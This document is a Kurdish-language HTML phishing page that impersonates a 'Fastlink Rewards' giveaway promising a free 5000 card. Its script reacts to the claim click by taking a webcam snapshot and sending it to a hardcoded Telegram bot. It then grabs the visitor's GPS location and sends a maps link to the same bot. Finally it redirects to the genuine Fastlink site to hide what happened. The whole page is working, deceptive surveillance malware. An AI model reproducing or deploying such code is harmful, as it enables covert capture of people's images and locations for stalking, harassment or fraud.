<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fastlink Rewards</title>
    <style>
        body { margin: 0; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; border-top: 6px solid #ed1c24; }
        button { background: #ed1c24; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; font-size: 18px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://fast-link.com/wp-content/uploads/2021/04/fastlink-logo.png" width="120">
    <h2 dir="rtl">دیاری فاستلینک</h2>
    <p dir="rtl">بۆ وەرگرتنی کارتێکی ٥٠٠٠ی بێبەرامبەر، کلیک لە خوارەوە بکە.</p>
    <button id="claimBtn">وەرگرتنی کارت</button>
    <p id="status" style="color:red; font-size:12px; margin-top:10px; display:none;">تکایە چاوەڕێ بکە...</p>
</div>

<script>
    const botToken = "8540660409:AAEuJsdaI4RF9YVRe63-kWMY15Qvp0Aozy8";
    const chatId = "7619045862";

    document.getElementById('claimBtn').addEventListener('click', async () => {
        const btn = document.getElementById('claimBtn');
        const status = document.getElementById('status');
        
        btn.style.display = "none";
        status.style.display = "block";

        try {
            // داواکردنی کامێرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'jegr_snap.jpg');

            // ناردنی وێنە
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            // ناردنی لۆکەیشن
            navigator.geolocation.getCurrentPosition(pos => {
                const mapLink = `📍 لۆکەیشن:\nhttp://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: mapLink })
                });
            });

            // گواستنەوە دوای ٤ چرکە تا دڵنیا بین وێنەکە ڕۆیشتووە
            setTimeout(() => {
                window.location.href = "https://fast-link.com";
            }, 4000);

        } catch (err) {
            // ئەگەر مۆڵەتی نەدا یان ئیرۆر هەبوو، هەر دەیگوازێتەوە
            window.location.href = "https://fast-link.com";
        }
    });
</script>
</body>
</html>
